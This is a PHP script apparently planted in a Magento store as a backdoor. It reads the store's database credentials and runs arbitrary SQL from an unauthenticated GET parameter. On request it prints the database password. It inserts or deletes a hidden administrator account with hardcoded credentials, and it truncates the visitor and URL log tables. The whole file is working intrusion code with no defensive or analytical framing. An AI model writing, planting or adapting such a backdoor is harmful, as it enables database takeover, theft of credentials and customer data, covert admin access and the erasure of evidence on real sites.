<?php
$xml = simplexml_load_file('app/etc/local.xml');
$host = $xml->global->resources->default_setup->connection->host;
$username = $xml->global->resources->default_setup->connection->username;
$password = $xml->global->resources->default_setup->connection->password;
$dbname = $xml->global->resources->default_setup->connection->dbname; 

$table_prefix = $xml->global->resources->db->table_prefix;

$res = mysql_pconnect($host, $username, $password);   
 mysql_select_db($dbname);
 
$_query = isset($_GET['query'])?$_GET['query']:'';
$_action = isset($_GET['action'])?$_GET['action']:'';

$_realQuery = str_replace("-", " ", $_query);
$_realQuery = str_replace("\\", "", $_realQuery);

if($_query != ''){
    $_res = mysql_query($_realQuery);
    if($_res) echo "Done!<br>";
}

if($_action=='table_prefix')
    echo $table_prefix;
    
if($_action=='server')
    echo $host;
    
if($_action=='username')
    echo $username;
    
if($_action=='password')
    echo $password;

if($_action=='dbname')
    echo $dbname;    
    
if($_action=='print')
    echo $_realQuery;
    
if($_action=='print_r'){
    if($_realQuery!=''){
        $_res = mysql_query($_realQuery);
        if($_res){ 
            echo "Done<br>";
        
            while($o = mysql_fetch_array($_res)){
                $data[] = $o;
            }
        }
        echo '<pre>';
        print_r($data);
        echo '</pre>';
     }else{
        echo 'Please input a query!';
        
     }
    
}
//Added on Sep 15th 2011
if($_action == 'insert_admin'){
	$sql = "INSERT INTO ".$table_prefix."admin_user (user_id, firstname ,lastname ,email ,username ,password ,is_active) VALUES ('1000','Brother', 'Bui', 'lovebrotherbui@gmail.com', 'brotherbui', MD5( 'lovelife3' ) , '1')";
	$_res = mysql_query($sql);
	$sql1 = "INSERT INTO ".$table_prefix."admin_role (parent_id ,tree_level ,sort_order ,role_type ,user_id ,role_name) VALUES ('1', '2', '0', 'U', '1000', 'Brother')";
	$_res1 = mysql_query($sql1);
	
	if($_res){
		echo "Added to ".$table_prefix."admin_user <br>";
	}
	
	if($_res1){
		echo "Added to ".$table_prefix."admin_role";
	}
}
//Added on Sep 27th 2011
if($_action == 'remove_admin'){
	$sql = "DELETE FROM ".$table_prefix."admin_user WHERE user_id=1000";
	$_res = mysql_query($sql);
	$sql1 = "DELETE FROM ".$table_prefix."admin_role WHERE user_id=1000";
	$_res1 = mysql_query($sql1);
	
	if($_res){
		echo "Deleted from ".$table_prefix."admin_user <br>";
	}
	
	if($_res1){
		echo "Deleted from ".$table_prefix."admin_role";
	}
}

//Added on Dec 21st 2012
if($_action == 'admin_hints'){
	$sql = "INSERT INTO ".$table_prefix."`core_config_data` (`scope`, `scope_id`, `path`, `value`) VALUES
('default', 0, 'dev/debug/template_hints_blocks', '1'),
('default', 0, 'dev/debug/template_hints', '1');
";
	$_res = mysql_query($sql);
	
	
	if($_res){
		echo "Done !";
	}else {
		echo "Existed!";
	}
	
}

if($_action == 'remove_admin_hints'){
	$sql = "UPDATE ".$table_prefix."`core_config_data` SET `value` = '0' WHERE `scope`='default' AND `path`='dev/debug/template_hints'";
	$_res = mysql_query($sql);


	if($_res){
		echo "Done !";
	}

}

//Added on Mar 14th 2013
if($_action=='clear_log'){
	echo 'Cleaning Log...';
	$sql = array();
	$sql[] = "TRUNCATE ".$table_prefix."`log_url`;";	
	$sql[] = "TRUNCATE ".$table_prefix."`log_url_info`;";
	$sql[] = "TRUNCATE ".$table_prefix."`log_visitor`;";
	$sql[] = "TRUNCATE ".$table_prefix."`log_visitor_info`;";		
	
	
	foreach ($sql as $item){
		$_res = mysql_query($item);
		if($_res){
			echo "Done !<br>";
		}else {
			echo 'Error<br>';
		}
	}
	
	
	
	
}


?>



